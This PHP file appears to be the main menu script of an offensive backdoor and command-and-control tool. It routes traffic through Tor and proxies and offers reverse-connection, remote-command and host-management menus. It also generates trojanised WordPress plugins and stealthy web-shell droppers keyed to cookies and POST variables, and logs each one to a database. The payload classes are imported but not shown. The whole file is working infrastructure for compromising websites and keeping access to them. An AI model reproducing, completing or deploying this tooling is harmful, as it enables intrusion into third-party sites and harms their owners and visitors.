<?php
require_once "classes.php";

use userAgents\agentsList;
use curlStuff\mainCurl;
use proxyWorks\confirmProxy;
use fake_the_landing\randomDefaultPage;
use proxies\populateRandomProxies;
use new_bots\makeMeSlim\slimDropper;
use new_bots\wordpressPlugins\makeMeWordPressing;
use logos\art\artisticStuff;
use logos\menus\mainMenu;

$d = default_config;
$configs = $d->exportConfigConstants();
$l = new artisticStuff(true);
$m = new mainMenu();
$agents = new agentsList();
$curl = new mainCurl(true, $configs['tor']);

$choices = [
    "postgres" => $configs['pg_presets'],
    "sqlite" => $configs['sqlite_presets']
];

if (str_contains(SQL_USE, "PGSQL")){
    $database = new database\slopPgSql($choices['postgres']['pg_host'], $choices['postgres']['pg_user'], $choices['postgres']['pg_pass']);
    $database->firstRun();
}else{

    $database = new database\slopSqlite($choices['sqlite']['sqlite_db']);
    var_dump($database->firstRun());
    readline("Press enter to continue.");
}

while (true){
    system(clear);
    $l->displayLogo();
    $m->menu();
    $c = strtolower(trim(readline("->")));
    switch ($c){
        case str_starts_with($c, "sys") !== false:
            $m->enumSystemMenu();
            break;
        case str_starts_with($c, "rev") !== false:
            $m->reverseConnectionsMenu();
            break;
        case str_starts_with($c, "com") !== false:
            $m->commandMenu();

            break;
        case str_starts_with($c, "a") !== false:
            $m->addHostMenu();
            break;
        case str_starts_with($c, "cr") !== false:
            $m->dropperMenu();
            if (str_contains(trim(strtolower(readline("-> "))), "press")){
                $trj = new makeMeWordPressing(readline("Activation Keyword?\n->"));
                $a = $trj->createTrojanWordpress();
                $database->insertData([
                    "action" => "add_press",
                    "zip" => $a['TrojanPlugin'],
                    "activator" => $a['ActivationWord']]
                );
            }else{
                $trj = new slimDropper($agents->getRandomAgent(), $configs['alpha_chars']);
                $a = $trj->generateDropper();
                $database->insertData([
                    "action" => "add_dropper",
                    "location_on_disk" => $a['dropper'],
                    "post_var" => $a['post_variable'],
                    "cookiename" => $a['cookie_name'],
                    "user_agent" => $a['user_agent']
                ]);
                readline();
            }
            break;
        case str_starts_with($c, "ch") !== false:
            $m->validateHost();
            break;
        case str_starts_with($c, "at") !== false:
            $m->addToolMenu();
            break;
        case str_starts_with($c, "lt") !== false:
            $m->grabToolsMenu();
            break;
        case str_starts_with($c, "gp") !== false:
            $m->grabProxyMenu();
            break;
        case str_starts_with($c, "r") !== false:
            $m->resetProxyMenu();
            break;
        case str_starts_with($c, "gc") !== false:
            $m->generateCertMenu();
            break;
        case str_starts_with($c, "o") !== false:
            var_dump($configs);
            readline("Press enter to continue.");
            break;
        case str_starts_with($c, "ac") !== false:
            break;
        case str_starts_with($c, "q") !== false:
            system(clear);
            foreach ($m->goodBye() as $bye) {
                echo "\033[0;34m{$bye}\033[0m" . PHP_EOL;
            }
            die();
        default:
            echo "\033[0;31mThat is not a valid command.";
            break;
    }
}
